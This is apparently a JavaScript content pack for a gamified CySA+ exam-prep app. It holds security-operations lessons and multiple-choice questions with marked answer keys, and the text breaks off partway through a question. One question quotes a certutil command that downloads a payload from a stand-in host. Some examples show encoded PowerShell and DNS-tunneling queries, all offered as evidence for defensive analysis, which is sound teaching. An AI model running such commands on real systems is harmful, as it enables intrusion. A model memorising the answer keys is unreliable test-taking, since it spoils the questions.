/* CONTENT PACK: CySA+ · Security Operations (cysa-ops) — 40 MCQ + 10 PBQ + 5 briefings + boss */
window.PACKS = window.PACKS || {};
window.PACKS["cysa-ops"] = {
lessons: {
"cysa-ops-1": { intro: "Ranger, the Hornet Swarm hides in ordinary traffic. Your first weapon is reading logs the way a pilot reads stars.",
sections: [
{ h: "What an indicator actually is", b: "An indicator of malicious activity is observable evidence that something hostile happened or is happening: a network artifact (beaconing, odd ports, DNS anomalies), a host artifact (strange parent-child processes, LOLBin abuse, resource spikes), or an identity artifact (impossible travel, off-hours logins, MFA fatigue bursts). The exam tests whether you can spot the indicator in raw data and name what it implies — not memorize lists." },
{ h: "Network indicators: beaconing is king", b: "Malware implants check in with their command server on timers. That produces the classic signature: connections at fixed intervals with near-identical byte sizes to one domain. Human browsing is bursty and variable. Also watch for: traffic to newly registered domains, DNS queries with long random subdomains (tunneling), unexpected outbound ports, and traffic volume that doesn't match the host's role.", data: "10:00:04 GET cdn-metrics[.]net/api 412B\n10:05:04 GET cdn-metrics[.]net/api 412B\n10:10:05 GET cdn-metrics[.]net/api 413B  ← fixed interval + uniform size = beacon" },
{ h: "Host indicators: parent-child lineage", b: "Processes have expected parents. WINWORD.EXE spawning powershell.exe with an encoded command means a macro just ran code. services.exe spawning cmd.exe is suspect. Attackers love living-off-the-land binaries (LOLBins) — powershell, wscript, certutil, rundll32, mshta — because they're signed and present everywhere. The question is never 'is powershell running' but 'who launched it, with what arguments, from where.'" },
{ h: "Identity & cloud indicators", b: "Impossible travel (Dallas 09:02, Lagos 09:47), logins at 3 a.m. from a 9-to-5 account, a burst of MFA prompts (fatigue attack), or one IP failing logins across 80 accounts (spray). In cloud audit logs, watch the principal, action, source IP, and result: an unfamiliar principal enumerating storage or creating credentials is the cloud version of a strange process tree." },
{ h: "Reading logs under pressure", b: "Method beats heroics: establish the timeframe, filter known-benign noise, pivot on one strong indicator (an IP, hash, or account) across other log sources, and build a timeline. Every conclusion should be traceable to a specific log line — that discipline is exactly what PBQs simulate." },
],
traps: [
"A single 'malicious IP' hit is weaker evidence than a behavioral pattern — the exam rewards periodicity and lineage over reputation lookups.",
"Big transfers aren't automatically exfiltration; one 90KB page load is normal. Context and direction matter.",
"Encoded PowerShell is common in legitimate management tooling — the parent process and path decide, not the encoding.",
"'Impossible travel' answers that jump straight to 'password compromised' miss token theft: MFA 'previously satisfied' on the far login is the tell." ],
keys: [
"Beaconing = fixed intervals + uniform sizes + one destination.",
"Judge processes by parent, arguments, and path — not by name.",
"Pivot one strong indicator across all log sources to scope.",
"Impossible travel + token reuse ⇒ session theft, not password theft.",
"Every finding maps to a log line you can point at." ] },

"cysa-ops-2": { intro: "Commander Nebula: 'Knowing the enemy's playbook, Ranger, is worth a squadron.' ATT&CK is that playbook.",
sections: [
{ h: "ATT&CK structure: tactics vs techniques", b: "MITRE ATT&CK organizes adversary behavior into tactics (the WHY — e.g., Initial Access, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Lateral Movement, Command and Control, Exfiltration, Impact) and techniques (the HOW — e.g., T1566 Phishing, T1071 Application Layer Protocol). Exam questions describe an observed behavior and ask you to place it: encryption for ransom = Impact/T1486; HTTPS beaconing = Command and Control/T1071.001." },
{ h: "The Pyramid of Pain", b: "Indicators vary in how much replacing them costs the attacker: hash values (trivial to change) < IP addresses < domains < network/host artifacts < tools < TTPs (behaviors — hardest to change). Blocking a hash inconveniences no one; detecting a technique like 'Office spawning script interpreters' hurts every intrusion that uses it. The exam loves asking which indicator type gives the most durable detection: TTPs." },
{ h: "Threat intelligence quality", b: "Evaluate CTI on source reliability, confidence, timeliness, and relevance to your environment. Levels: strategic (leadership trends), operational (campaigns/actors), tactical (TTPs for defenders), technical (raw IoCs, shortest shelf life). A feed of month-old IPs is low value; a report of an actor's TTPs targeting your sector is high value." },
{ h: "Hypothesis-driven hunting", b: "Hunting starts from a hypothesis, not an alert: 'If an actor used T1053 scheduled tasks for persistence, we'd see schtasks.exe creations outside deployment windows.' Then you query for it, refine, and either find evidence or increase confidence in coverage. Successful hunts get promoted into permanent detections — hunting output should always improve the SOC, win or lose.", data: "Hypothesis → data source → query → findings → new detection rule" },
],
traps: [
"Tactic vs technique swap: 'Command and Control' is a tactic; 'T1071 Web Protocols' is the technique under it. Read which one the question asks for.",
"Persistence explains surviving reboots; C2 explains check-ins — don't map beaconing to Persistence.",
"Exfiltration requires evidence of data leaving. Heartbeat-sized traffic isn't exfil.",
"'Most durable indicator to detect' = TTP/behavior, never hash or IP." ],
keys: [
"Tactic = goal, technique = method; memorize the 14 tactic names.",
"Pyramid of Pain: TTP detections hurt attackers most.",
"CTI value = reliability × relevance × freshness.",
"Hunt from hypotheses; promote successful hunts to detections." ] },

"cysa-ops-3": { intro: "The LGMs tapped the fleet's network spine for you. Telemetry is truth — if you can read it.",
sections: [
{ h: "Flow data vs packet capture", b: "NetFlow/IPFIX records who talked to whom, when, how much — cheap to keep, perfect for scoping ('which hosts contacted 185.220.x.x?'). PCAP is full packet content — expensive, but the only way to see payloads. Exam pattern: scoping and volume questions → flow data; 'what was actually sent' questions → PCAP. Zeek sits in between, distilling packets into rich protocol logs." },
{ h: "DNS analysis", b: "DNS betrays attackers constantly: newly registered domains, algorithmically generated names (DGA — long, random, consonant-heavy), high-entropy subdomains carrying encoded data (tunneling), and TXT-record abuse. A host making thousands of unique-subdomain queries to one domain is tunneling data through port 53.", data: "aGVsbG8ta2V5.x7f2.badcdn[.]io\ndGhpcy1pcy1l.x7f2.badcdn[.]io   ← encoded chunks as subdomains = DNS tunneling" },
{ h: "IDS/IPS telemetry: Suricata & Zeek", b: "Signature-based sensors (Suricata/Snort) fire on known patterns; Zeek produces protocol logs (conn.log, dns.log, http.log) for behavioral analysis. Know placement: a sensor inside the perimeter sees post-NAT internal addresses; TLS blinds payload signatures unless traffic is decrypted — but JA3-style fingerprints and metadata still work." },
{ h: "Endpoint telemetry: process trees and memory", b: "EDR gives you the process tree (lineage, arguments, injected modules), file and registry writes, and network connections per process. Order of volatility matters when collecting: memory first (running processes, keys, injected code exist only there), then disk. A process with no on-disk binary (fileless) is only catchable in memory/EDR telemetry." },
],
traps: [
"Choosing PCAP for a scoping question wastes the cheap answer — flow data scopes, PCAP proves content.",
"TLS doesn't make network monitoring useless: metadata, SNI, JA3, and flow patterns survive encryption.",
"DGA vs typo-squat: DGA is random machine-generated; typosquats mimic real brands. Different indicators.",
"Memory before disk — reversed order-of-volatility answers are always wrong." ],
keys: [
"Flow = who/when/how much; PCAP = what exactly.",
"High-entropy subdomains at volume = DNS tunneling.",
"Zeek logs enable behavior analysis; Suricata fires signatures.",
"Fileless malware lives in memory — collect volatile data first." ] },

"cysa-ops-4": { intro: "A SIEM that cries wolf gets ignored — and that's when the Swarm slips through. Tune like an engineer.",
sections: [
{ h: "Detection architecture basics", b: "Detection quality is built on logging architecture: complete source coverage, synchronized time (NTP — without it, timelines lie), adequate retention, and log integrity. SIEM correlation rules combine events across sources ('failed logins > N from one IP then a success'); SOAR automates the response side (enrich, notify, contain). EDR/XDR feed the richest host telemetry in." },
{ h: "The tuning discipline", b: "Reducing false positives must not reduce coverage. The method: sample the alerts, verify benign cause by evidence (parent process, hash, path, source), then write the NARROWEST exception that fits — e.g., parent=SCCM_Agent AND known hash AND expected path. Broad exceptions ('anything signed by us') and disabled rules are how real intrusions hide inside 'fixed' noise.", data: "398/400 alerts: SCCM_Agent → signed script (benign)\n2/400: WINWORD.EXE → encoded powershell (investigate!)  ← never batch these together" },
{ h: "Thresholds, baselines, and metrics", b: "Thresholds trade sensitivity for noise — raising one to silence a known-good source also blinds you to attacks under the new bar; prefer targeted exclusions (allowlists/watchlists). Baselines define 'normal' so anomalies stand out. Measure the program: false-positive rate, alert-to-incident ratio, MTTD/MTTR trends, and detection coverage mapped against ATT&CK." },
{ h: "AI in security operations (V4 addition)", b: "CySA+ V4 expects awareness of ML-assisted operations: anomaly detection models (good at novel behavior, prone to drift and poisoning), AI-assisted triage/summarization (validate outputs — hallucinated fields fail silently), and the rule that AI proposes while humans approve consequential actions. Rules and models complement: rules for known-bad precision, models for unknown-unknowns." },
],
traps: [
"Disabling a noisy rule is almost never the answer — the rule that annoys you is often the one that catches the real thing.",
"Raising thresholds to dodge one benign source lets attackers ride under the new threshold.",
"Time-sync (NTP) questions hide in timeline scenarios — mismatched clocks explain 'impossible' event orders.",
"After ANY tuning change, the validation step is testing against known-true-positive data — not waiting to see." ],
keys: [
"Tune with narrow, compound, documented exceptions.",
"Never trade coverage for quiet; prefer exclusions over thresholds.",
"Validate tuning against known-bad test data.",
"AI assists triage; humans gate consequential actions." ] },

"cysa-ops-5": { intro: "Most breaches start with one email and one click. Guard the inbox like an airlock.",
sections: [
{ h: "Email authentication: SPF, DKIM, DMARC", b: "SPF lists which servers may send for a domain (receiver checks the envelope sender's IP). DKIM cryptographically signs messages so tampering and forgery are detectable. DMARC ties them together with alignment and tells receivers what to do on failure (none/quarantine/reject) plus reporting. A phish spoofing your exact domain that lands in inboxes usually means DMARC is missing or p=none.", data: "Authentication-Results:\n spf=fail (sender IP not permitted)\n dkim=none\n dmarc=fail action=none   ← policy 'none' = deliver anyway" },
{ h: "Header and URL analysis", b: "Walk headers bottom-up through Received hops; compare From (display) vs Return-Path/envelope sender; mismatches plus a reply-to at a lookalike domain scream phish. URLs: hover-vs-display mismatch, lookalike domains (rn→m), open redirects, and URL shorteners. Detonate suspicious attachments and links in a sandbox — never on a Ranger's workstation." },
{ h: "Malicious attachments & the macro chain", b: "The classic chain: .docm/.xlsm attachment → user enables macros → Office spawns powershell/wscript with encoded arguments → payload download. Modern variants: ISO/LNK files that sidestep mark-of-the-web, HTML smuggling, and OneNote lures. Detection: Office spawning script interpreters is one of the highest-value analytics that exists." },
{ h: "Session & identity threats (zero trust context)", b: "Adversary-in-the-middle phishing kits proxy the real login page, capturing both the password and the session token — so MFA is 'satisfied' and then replayed. Indicators: impossible travel with token reuse, unfamiliar device joining mid-session. Zero trust response: verify explicitly (risk-based reauth), least privilege, assume breach. Phishing-resistant MFA (FIDO2) defeats AiTM because credentials bind to the origin." },
],
traps: [
"SPF checks the envelope sender, not the pretty From header — spoofed display names can pass SPF.",
"DMARC p=none means monitor only; mail still delivers. Failing DMARC ≠ blocked.",
"MFA satisfied does not mean the login was legitimate — token replay says otherwise.",
"The fix for AiTM is phishing-resistant (FIDO2) MFA, not 'more MFA prompts.'" ],
keys: [
"SPF = allowed senders, DKIM = signature, DMARC = policy + alignment.",
"Office spawning script engines = top-tier detection.",
"AiTM steals sessions, not just passwords — revoke tokens to evict.",
"FIDO2 binds auth to the origin; it's the AiTM killer." ] },
},
mcq: {
"cysa-ops-1": [
{ s: "Night shift at Fleet Ops. A finance workstation's proxy log is pulled for review.", e: "09:00:04 GET sync-cdn[.]net/a 402B\n09:05:04 GET sync-cdn[.]net/a 402B\n09:10:05 GET sync-cdn[.]net/a 403B\n09:11:20 GET news.site.com 91KB", q: "Which observation most strongly indicates command-and-control activity?", options: [
 { t: "Fixed 5-minute intervals with near-identical byte sizes to one domain", c: true, w: "Timer-driven, uniform check-ins are the beaconing signature; humans browse in variable bursts." },
 { t: "The 91KB transfer to news.site.com", c: false, w: "A single normal-sized page load is ordinary browsing — size alone isn't an indicator." },
 { t: "Use of GET requests instead of POST", c: false, w: "HTTP method choice is not an indicator; both are used constantly by benign traffic." },
 { t: "Any traffic occurring before business hours", c: false, w: "09:00 isn't off-hours, and time alone without a baseline proves nothing." } ] },
{ s: "EDR flags a process on a laptop in the hangar bay.", e: "WINWORD.EXE → powershell.exe -enc JABz...\nDoc opened from email 3 min prior: invoice_Q3.docm", q: "What does this parent-child relationship most likely indicate?", options: [
 { t: "A malicious macro executed code — a likely initial access event", c: true, w: "Office spawning encoded PowerShell right after a .docm email attachment is the textbook macro chain." },
 { t: "Normal Office behavior when updating add-ins", c: false, w: "Office updates don't launch encoded PowerShell; this lineage is never routine." },
 { t: "An IT admin running maintenance scripts", c: false, w: "Admin tooling runs from management agents (SCCM/Intune), not from inside Word." },
 { t: "Evidence of data exfiltration in progress", c: false, w: "Nothing shows data leaving — this is execution/initial access, not exfil. Don't skip ahead of evidence." } ] },
{ s: "An analyst reviews Entra sign-in logs after a phishing wave.", e: "j.rivera: Dallas 08:58 ✓ MFA\nj.rivera: overseas IP 09:36 ✓ 'MFA previously satisfied'", q: "What is the most likely explanation?", options: [
 { t: "Session token theft and replay — the attacker reused a valid token", c: true, w: "Impossible travel plus 'previously satisfied' MFA means the session, not the password, was stolen." },
 { t: "The user's password was cracked by brute force", c: false, w: "A cracked password would trigger a fresh MFA challenge, not token reuse." },
 { t: "A benign VPN exit-node change", c: false, w: "Possible in general, but paired with a phishing wave and token reuse, the malicious explanation dominates; verify, don't dismiss." },
 { t: "Clock skew between logging systems", c: false, w: "Skew shuffles timestamps slightly; it doesn't fabricate a second country and a token-reuse artifact." } ] },
{ s: "SOC review of yesterday's authentications.", e: "1 source IP → 84 different accounts\n1-2 failed attempts each · result code: bad password\n2 accounts: success on first try", q: "This pattern is best classified as:", options: [
 { t: "Password spraying, with two likely compromised accounts", c: true, w: "Many accounts, few attempts each, one source = spray; the successes are your incident." },
 { t: "Brute force against a single account", c: false, w: "Brute force is many attempts against few accounts — the inverse of this distribution." },
 { t: "Normal helpdesk password-reset activity", c: false, w: "Helpdesk activity doesn't originate 84 accounts' attempts from one external IP." },
 { t: "MFA fatigue attack", c: false, w: "Fatigue attacks bombard one user with push prompts after credential theft — different signature." } ] },
{ s: "A DNS log review on a quiet subnet.", e: "4,812 queries in 1h from HOST-DEV-3:\n aGVsbG8x.k2.datapipe[.]io\n dGVzdDEy.k2.datapipe[.]io\n (unique subdomain every query)", q: "What activity does this most likely represent?", options: [
 { t: "DNS tunneling — data encoded into subdomains", c: true, w: "Thousands of unique, high-entropy subdomains to one domain is data moving through port 53." },
 { t: "A misconfigured DNS resolver looping", c: false, w: "Loops repeat the same query; these are unique encoded labels each time." },
 { t: "Normal CDN behavior", c: false, w: "CDNs use a modest set of stable hostnames, not one-time random labels at this volume." },
 { t: "A DGA-based malware finding its C2", c: false, w: "DGA rotates the registered domain; here the domain is constant and the subdomain carries payload — that's tunneling." } ] },
{ s: "Cloud audit log triage after an access review.", e: "principal: svc-backup-old · action: ListBuckets, GetObject x400\nsourceIP: residential ISP · time: 02:30 · last legit use: 8 months ago", q: "Which element makes this MOST suspicious?", options: [
 { t: "A dormant service identity suddenly enumerating and reading storage from a residential IP", c: true, w: "Stale credentials awakening to enumerate data from unexpected infrastructure is a classic compromised-credential pattern." },
 { t: "The use of GetObject, which is inherently dangerous", c: false, w: "GetObject is routine; the actor, source, and dormancy make it hostile, not the API name." },
 { t: "The 02:30 timestamp alone", c: false, w: "Backups legitimately run overnight — time only matters combined with the other anomalies." },
 { t: "Use of a service account instead of a user account", c: false, w: "Service accounts are normal; unexplained revival of an unused one is the issue." } ] },
{ s: "You must scope a confirmed C2 domain across the fleet quickly.", e: "Confirmed IoC: cdn-sync[.]io\nAvailable: 90 days NetFlow, 48h rolling PCAP, EDR, proxy logs", q: "What is the BEST first pivot?", options: [
 { t: "Query proxy/flow data for all hosts contacting the domain over the retention window", c: true, w: "Scoping = who else talked to it; flow/proxy data answers that across months in one query." },
 { t: "Open the 48h PCAP and read payloads", c: false, w: "PCAP proves content, but 48h can't scope a possibly weeks-old intrusion — and it's the slow tool." },
 { t: "Reimage the first infected host, then look around", c: false, w: "Acting before scoping destroys evidence and leaves the other infected hosts running." },
 { t: "Block the domain and consider the incident scoped", c: false, w: "Blocking is containment, not scoping; you still don't know who was infected." } ] },
{ s: "An analyst claims a host is clean because antivirus found no malicious files on disk.", e: "EDR: powershell.exe holding open C2 connection\nDisk scan: no malicious binaries found", q: "What explains the contradiction?", options: [
 { t: "Fileless malware executing in memory — disk scans can't see it", c: true, w: "Payloads injected into legitimate processes leave no file for AV; memory/EDR telemetry is where they exist." },
 { t: "The EDR alert must be a false positive", c: false, w: "An observed live C2 connection outweighs a negative disk scan; absence of files isn't absence of malware." },
 { t: "The antivirus signatures are simply outdated", c: false, w: "Even current signatures can't scan what never touches disk — the gap is architectural, not a version issue." },
 { t: "PowerShell itself is the malware and should be deleted", c: false, w: "PowerShell is a signed OS component being abused; the payload lives in its memory space." } ] } ],

"cysa-ops-2": [
{ s: "An implant checks in to its operator over HTTPS every 10 minutes.", e: "Behavior: periodic HTTPS check-ins blending with web traffic", q: "Map this to MITRE ATT&CK:", options: [
 { t: "Command and Control — T1071.001 Web Protocols", c: true, w: "C2 over standard web protocols to blend in is exactly T1071.001 under the C2 tactic." },
 { t: "Exfiltration — T1048", c: false, w: "No data-theft evidence exists; heartbeats are check-ins, not exfil." },
 { t: "Persistence — T1547", c: false, w: "Persistence is how the implant survives reboots — a different question than how it communicates." },
 { t: "Initial Access — T1566 Phishing", c: false, w: "That's how it may have arrived; the observed behavior now is communication." } ] },
{ s: "A ransomware crew encrypts a hospital's file servers and demands payment.", e: "Files encrypted, ransom note dropped", q: "The encryption itself maps to which tactic/technique?", options: [
 { t: "Impact — T1486 Data Encrypted for Impact", c: true, w: "Destroying availability for extortion is the Impact tactic; T1486 is its signature technique." },
 { t: "Defense Evasion — T1027 Obfuscation", c: false, w: "Obfuscation hides the attacker's code, not the victim's data." },
 { t: "Collection — T1005 Data from Local System", c: false, w: "Collection gathers data for theft; this encrypts in place to break the business." },
 { t: "Credential Access — T1003", c: false, w: "No credential theft is described in the encryption act itself." } ] },
{ s: "Your CISO asks which detection investment hurts attackers the most long-term.", e: "Pyramid of Pain: hashes < IPs < domains < artifacts < tools < TTPs", q: "Per the Pyramid of Pain, prioritize detections for:", options: [
 { t: "Behaviors/TTPs, such as Office spawning script interpreters", c: true, w: "TTPs are the most expensive thing for attackers to change — behavioral detections survive infrastructure rotation." },
 { t: "The file hashes from last month's incident", c: false, w: "Hashes are trivially changed by recompiling; bottom of the pyramid." },
 { t: "The attacker's current IP addresses", c: false, w: "IPs rotate in minutes on rented infrastructure." },
 { t: "The attacker's current domain names", c: false, w: "Better than IPs, still cheap to replace; behavior beats infrastructure." } ] },
{ s: "Two intel reports land on your desk during an active campaign against your sector.", e: "Report A: 500 IP indicators, 6 weeks old, unknown source\nReport B: verified vendor analysis of actor TTPs targeting your industry, this week", q: "Which report is more valuable and why?", options: [
 { t: "B — fresh, reliable, relevant TTP intelligence enables durable detections", c: true, w: "Value = reliability × relevance × freshness; TTPs also outlast the stale IPs in A." },
 { t: "A — 500 indicators offer more coverage than one report", c: false, w: "Volume of expired, unattributed IoCs is noise, not coverage." },
 { t: "A — technical indicators are always superior to narrative analysis", c: false, w: "Technical IoCs have the shortest shelf life on the pyramid; six weeks is ancient." },
 { t: "Both equal — all intelligence should be loaded into the SIEM", c: false, w: "Loading stale indiscriminate IoCs generates false positives and dilutes analyst trust." } ] },
{ s: "You want to hunt for scheduled-task persistence (T1053).", e: "Available: EDR process events, Windows event logs, deployment calendar", q: "What does a hypothesis-driven hunt look like here?", options: [
 { t: "\"If T1053 is present, schtasks.exe creations will appear outside deployment windows\" — then query and compare", c: true, w: "A falsifiable hypothesis tied to a data source and expected evidence is the definition of structured hunting." },
 { t: "Scroll recent EDR alerts and see what looks weird", c: false, w: "Alert review is triage, not hunting — hunting looks for what didn't alert." },
 { t: "Search all logs for the string 'T1053'", c: false, w: "ATT&CK IDs are analyst labels; they don't appear in telemetry." },
 { t: "Wait for threat intel to publish task names to search for", c: false, w: "Hunting is proactive; waiting for IoCs is the opposite of the exercise." } ] },
{ s: "A hunt for anomalous service creations finds nothing malicious.", e: "Hunt result: no true positives; query validated against a red-team dataset", q: "What is the correct disposition of this hunt?", options: [
 { t: "Document coverage confidence and promote the validated query into a scheduled detection", c: true, w: "A clean, validated hunt still produces value: assurance plus a new permanent detection." },
 { t: "Record it as wasted effort and pick a new topic", c: false, w: "Hunts that find nothing but validate detection capability are successes, not waste." },
 { t: "Rerun the same hunt daily by hand until it finds something", c: false, w: "That's what scheduled analytics are for — automate the validated logic." },
 { t: "Lower the query's thresholds until it returns hits", c: false, w: "Manufacturing findings creates false positives; hunts must not be tuned toward noise." } ] },
{ s: "An observed intrusion: phish → macro → credential dump → RDP to a second host.", e: "Sequence spans multiple behaviors", q: "The RDP movement to a second host maps to which tactic?", options: [
 { t: "Lateral Movement", c: true, w: "Using valid sessions/protocols to reach additional systems is the Lateral Movement tactic (e.g., T1021.001 RDP)." },
 { t: "Privilege Escalation", c: false, w: "Escalation raises rights on a system; moving between systems is lateral movement." },
 { t: "Discovery", c: false, w: "Discovery is learning the environment; the hop itself is movement." },
 { t: "Initial Access", c: false, w: "Initial access already happened via the phish — first entry only counts once." } ] },
{ s: "A junior analyst wants to attribute an intrusion to a named nation-state group based on one tool match.", e: "Evidence: one publicly available tool also used by many actors", q: "What's the right guidance?", options: [
 { t: "Attribution needs corroborated evidence across TTPs and infrastructure; shared public tooling alone proves little", c: true, w: "Commodity tools are used by everyone; responsible attribution is evidence-weighted and usually out of scope for the SOC's response decisions anyway." },
 { t: "Publish the attribution — speed matters more than certainty", c: false, w: "Wrong public attribution damages credibility and can misdirect response." },
 { t: "Attribution is impossible, so never discuss actors", c: false, w: "Overcorrection — actor intelligence informs defense; it just requires evidence discipline." },
 { t: "Match the tool's hash against ATT&CK to confirm the actor", c: false, w: "ATT&CK catalogs behaviors, not a hash-to-actor oracle." } ] } ],

"cysa-ops-3": [
{ s: "Leadership asks which hosts communicated with a confirmed hostile IP over the past 60 days.", e: "Available: NetFlow (90d), PCAP (48h rolling), proxy (30d)", q: "Best data source for this question:", options: [
 { t: "NetFlow — long-retention who-talked-to-whom records", c: true, w: "Flow data exists precisely for cheap, long-horizon scoping of communications." },
 { t: "PCAP — the most detailed source available", c: false, w: "Detail you don't need with retention that can't cover the window." },
 { t: "Endpoint AV scan results", c: false, w: "AV verdicts say nothing about network communications history." },
 { t: "Firewall configuration backups", c: false, w: "Configs show policy, not observed traffic." } ] },
{ s: "You must prove exactly what data was submitted in a suspicious HTTP POST yesterday.", e: "The transaction occurred 20 hours ago on a monitored segment", q: "Which source can answer definitively?", options: [
 { t: "Full packet capture from that segment", c: true, w: "Only PCAP preserves payload content; flows and proxies summarize but don't retain bodies." },
 { t: "NetFlow records of the session", c: false, w: "Flow tells you bytes and endpoints, never the content." },
 { t: "The user's recollection of what they uploaded", c: false, w: "Human memory isn't forensic evidence." },
 { t: "DNS logs for the destination domain", c: false, w: "DNS shows resolution, not payload." } ] },
{ s: "Zeek conn.log review on a workstation VLAN.", e: "host 10.2.4.19 → 10.2.4.0/24: SYN to ports 445,3389,22,80 on 254 hosts in 3 min", q: "This pattern indicates:", options: [
 { t: "Internal network scanning — likely Discovery/lateral movement staging", c: true, w: "One host sweeping the subnet across admin ports is enumeration, mapping to Discovery (T1046)." },
 { t: "Normal SMB file-sharing behavior", c: false, w: "File sharing connects to a few servers, not every host on four ports." },
 { t: "A DDoS attack against the workstation", c: false, w: "Direction is outbound from the host — it's the scanner, not the target." },
 { t: "Vulnerability scanner activity, therefore always benign", c: false, w: "Could be a sanctioned scanner — but that's verified by asset identity, not assumed; a workstation doing this is hostile until proven otherwise." } ] },
{ s: "A malware payload allegedly runs only in memory. The IR lead sequences evidence collection.", e: "Host is live; decision: what to capture first", q: "Correct order per order-of-volatility:", options: [
 { t: "Memory image first, then disk image, then logs already persisted", c: true, w: "Volatile data disappears at power-off; capture RAM before anything that survives on disk." },
 { t: "Disk image first since it's the largest", c: false, w: "Size doesn't set order — volatility does; the in-memory payload dies while you image the disk." },
 { t: "Power the host off immediately to freeze all evidence", c: false, w: "Power-off destroys exactly the volatile evidence this case depends on." },
 { t: "Logs first because they're easiest", c: false, w: "Persisted logs aren't going anywhere; RAM is." } ] },
{ s: "Your Suricata sensors went quiet on payload signatures after the org moved to TLS-everywhere.", e: "Traffic now >95% encrypted at the monitored point", q: "What remains detectable WITHOUT decryption?", options: [
 { t: "Connection metadata: destinations, timing/beacon patterns, JA3-style fingerprints, SNI, volumes", c: true, w: "Encryption hides payloads, not behavior — beaconing, rare destinations, and TLS fingerprints still work." },
 { t: "Nothing — encrypted traffic cannot be monitored", c: false, w: "Metadata analysis is a core encrypted-era skill; giving up is wrong and exam-wrong." },
 { t: "Payload signatures still match inside TLS", c: false, w: "By definition, content signatures can't read ciphertext." },
 { t: "Only DNS remains useful", c: false, w: "DNS helps, but flow metadata and TLS fingerprints are equally alive." } ] },
{ s: "EDR shows a suspicious chain on a maintenance server.", e: "services.exe → cmd.exe → certutil.exe -urlcache -f http://x.io/p.bin", q: "Why is this chain alarming?", options: [
 { t: "A LOLBin (certutil) is being used as a downloader from an unusual parent chain", c: true, w: "certutil's URL-fetch abuse is classic living-off-the-land; services.exe→cmd is not routine lineage." },
 { t: "certutil.exe is unsigned malware", c: false, w: "It's a signed Windows binary — that's exactly why attackers use it." },
 { t: "cmd.exe running on a server is itself an incident", c: false, w: "Shells run legitimately constantly; arguments and lineage make this case." },
 { t: "HTTP instead of HTTPS is the core issue", c: false, w: "The downloader behavior is the issue, whatever the scheme." } ] },
{ s: "Analysts debate sensor placement for a new IDS.", e: "Option A: outside the firewall · Option B: inside, behind NAT", q: "Key tradeoff to communicate:", options: [
 { t: "Outside sees all internet noise pre-filter; inside sees real internal addresses and what actually got through", c: true, w: "Placement defines visibility: external = raw threat weather; internal = actionable, attributed events. Many orgs deploy both." },
 { t: "Placement doesn't matter for detection", c: false, w: "It changes what addresses and which traffic you can even see." },
 { t: "Inside placement is wrong because NAT breaks IDS", c: false, w: "Inside placement is precisely how you preserve true internal IPs." },
 { t: "Outside placement removes the need for tuning", c: false, w: "Outside placement multiplies noise — tuning matters more, not less." } ] },
{ s: "A DGA-infected host and a DNS-tunneling host both appear in today's queue.", e: "Host A: thousands of random *registered-domain* lookups, most NXDOMAIN\nHost B: thousands of random *subdomains* under one registered domain", q: "Correctly distinguish them:", options: [
 { t: "A = DGA (malware seeking its C2 domain); B = DNS tunneling (data in subdomains)", c: true, w: "DGA rotates the registered domain hunting for a live one (mass NXDOMAIN); tunneling keeps one domain and encodes data in labels." },
 { t: "Both are DGA variants", c: false, w: "The constant registered domain with payload subdomains is tunneling, not domain generation." },
 { t: "Both are tunneling", c: false, w: "Mass NXDOMAIN across many registered domains is the DGA fingerprint." },
 { t: "A is benign CDN, B is DGA", c: false, w: "Reversed and wrong — high NXDOMAIN randomness is not CDN behavior." } ] } ],

"cysa-ops-4": [
{ s: "A new EDR rule for 'encoded PowerShell' fires 400 times overnight.", e: "398x: parent SCCM_Agent.exe, signed script, path C:\\ProgramData\\SCCM\\\n2x: parent WINWORD.EXE, path C:\\Users\\...\\AppData\\Temp\\", q: "Best tuning action?", options: [
 { t: "Write a narrow exception (parent=SCCM_Agent AND known hash AND expected path) and investigate the two Word-spawned events", c: true, w: "Compound, narrow exceptions kill the noise while keeping coverage — and the two outliers are your real alerts." },
 { t: "Disable the rule; it's clearly too noisy", c: false, w: "The rule just caught two probable intrusions. Disabling trades a real detection for quiet." },
 { t: "Raise the alert threshold to 10 events per host", c: false, w: "Real attacks fire once or twice; thresholds hide exactly the events you need." },
 { t: "Exclude everything running from C:\\ProgramData", c: false, w: "A broad path exclusion is a gift to attackers, who routinely stage in ProgramData." } ] },
{ s: "During an incident timeline reconstruction, events appear to happen in impossible order across two servers.", e: "SRV-A: attack step logged 03:12:44\nSRV-B: prerequisite step logged 03:14:02", q: "Most likely explanation to check FIRST:", options: [
 { t: "Clock drift — verify both servers sync to NTP", c: true, w: "Unsynchronized clocks are the classic cause of impossible timelines; verify time sources before exotic theories." },
 { t: "The attacker time-traveled the logs", c: false, w: "Log tampering is possible but NTP drift is far more common and checked first." },
 { t: "The SIEM database is corrupted", c: false, w: "Possible but rare; time sync is the standard first check." },
 { t: "The events are unrelated", c: false, w: "They're causally linked steps of the same intrusion; sequencing is the issue." } ] },
{ s: "A SOC drowns in alerts; leadership will fund exactly one improvement.", e: "Current: no SOAR, alert-to-incident ratio 900:1, MTTD 6 days", q: "Highest-impact investment for triage load?", options: [
 { t: "SOAR automation for enrichment and de-duplication of the alert queue", c: true, w: "SOAR attacks the 900:1 ratio directly by auto-enriching, correlating, and closing known-benign patterns before humans see them." },
 { t: "A second SIEM for redundancy", c: false, w: "Duplicate SIEMs duplicate the alert flood." },
 { t: "Longer log retention", c: false, w: "Retention helps forensics, not daily triage load." },
 { t: "More detection rules", c: false, w: "More rules without tuning/automation worsens the ratio." } ] },
{ s: "After tuning a detection rule, the engineer must validate the change.", e: "Change: added exception for backup-agent activity", q: "Correct validation step:", options: [
 { t: "Replay known-true-positive attack data and confirm the rule still fires", c: true, w: "Tuning is only safe if proven against known-bad; passive waiting can't distinguish 'quiet' from 'blind.'" },
 { t: "Wait a week and see if analysts complain", c: false, w: "Silence could mean the rule is now blind — you can't tell without testing." },
 { t: "Confirm the alert count dropped", c: false, w: "Count dropping is the goal AND the failure mode; it proves nothing alone." },
 { t: "Ask the backup vendor if the exception looks right", c: false, w: "Vendors don't know your detection coverage; test with data." } ] },
{ s: "An ML-based anomaly detector flags a service account at 3 a.m.; a scheduled job explains it. Weeks later the model stops flagging a genuinely new attack pattern.", e: "Model retrains continuously on live traffic", q: "What likely happened?", options: [
 { t: "Model drift/normalization — continuous retraining absorbed the attacker's behavior into 'normal'", c: true, w: "Slow-roll attackers poison baselines; continuously self-training models normalize persistent malicious behavior. Guard with holdout validation and human review." },
 { t: "The model ran out of storage", c: false, w: "Capacity issues throw errors; they don't selectively unlearn attacks." },
 { t: "ML models cannot detect network attacks", c: false, w: "They can — the failure mode here is baseline poisoning, not incapability." },
